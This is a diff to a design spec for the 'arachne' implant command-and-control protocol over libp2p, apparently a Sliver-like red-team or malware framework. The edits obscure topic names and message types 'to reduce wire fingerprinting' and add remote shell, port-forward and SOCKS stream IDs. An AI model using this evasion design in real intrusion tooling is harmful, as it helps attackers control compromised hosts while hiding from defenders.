@@ -19,25 +19,28 @@ On first execution, the implant generates:
 
 ## 2. Topic Structure
 
-All topics use GossipSub via libp2p PubSub.
+All topics use GossipSub via libp2p PubSub. Topic IDs use short opaque prefixes to reduce wire fingerprinting.
 
 ```
-arachne/<operator-peerid>/commands    # Operator -> Implants (read by all implants)
-arachne/<operator-peerid>/beacons     # Implants -> Operator (heartbeat & results)
-arachne/<operator-peerid>/tasks/<implant-peerid>  # Direct task routing
+/c/<operator-peerid>/cx    # Commands — operator -> implants (broadcast)
+/b/<operator-peerid>/bx    # Beacons — implants -> operator (heartbeat & results)
+/b/<operator-peerid>/tx/<implant-peerid>  # Per-implant task topic (direct routing)
 ```
 
 ### Topic Authorization
 - `commands` topic: messages validated against operator's public key
 - `beacons` topic: messages validated against implant's public key
-- Implants drop messages not signed by the operator on `commands`
+- `tasks/<id>` topic: messages validated against operator's public key
+- Implants drop messages not signed by the operator
 - Operator drops messages not signed by known implants on `beacons`
 
 ## 3. Envelope Format
 
-All messages use Protocol Buffers (same approach as Sliver).
+All messages use Protocol Buffers. Message types use opaque Z-series identifiers.
 
 ```protobuf
+package apb;
+
 message Envelope {
   int64 ID = 1;
   uint32 Type = 2;
@@ -46,34 +49,31 @@ message Envelope {
   bytes SenderKey = 5;   // Public key of sender
 }
 
-message BeaconRegister {
-  string ImplantID = 1;
+// Z1 — Beacon register (async beacon mode)
+message Z1 {
+  string ID = 1;
   int64 Interval = 2;
   int64 Jitter = 3;
-  Register Register = 4;
-}
-
-message Register {
-  string Name = 1;
-  string Hostname = 2;
-  string UUID = 3;
-  string Username = 4;
-  string UID = 5;
-  string GID = 6;
-  string OS = 7;
-  string Arch = 8;
-  int32 PID = 9;
-  string Filename = 10;
-  string Version = 11;
-  int64 PeerID = 12;
+  Register Register = 4;  // commonpb.Register
+  int64 NextCheckin = 5;
 }
 ```
+
+## 4. Protocol IDs
+
+Direct libp2p streams use short protocol IDs:
+
+| Protocol | ID |
+|---|---|
+| Shell | `/x/sh/1.0.0` |
+| Port forward | `/x/pf/1.0.0` |
+| SOCKS | `/x/sk/1.0.0` |
 
 ## 4. Session Types
 
 ### 4.1 Beacon Mode (Async)
-1. Implant subscribes to `commands` topic
-2. Implant publishes `BeaconRegister` on `beacons` topic
+1. Implant subscribes to `commands` topic and its per-implant `tasks/<id>` topic
+2. Implant publishes `Z1` (beacon register) on `beacons` topic
 3. Operator reads beacon, publishes tasks on `tasks/<id>` topic
 4. Implant executes tasks, publishes results on `beacons`
 5. Implant sleeps for `Interval + random(0, Jitter)`
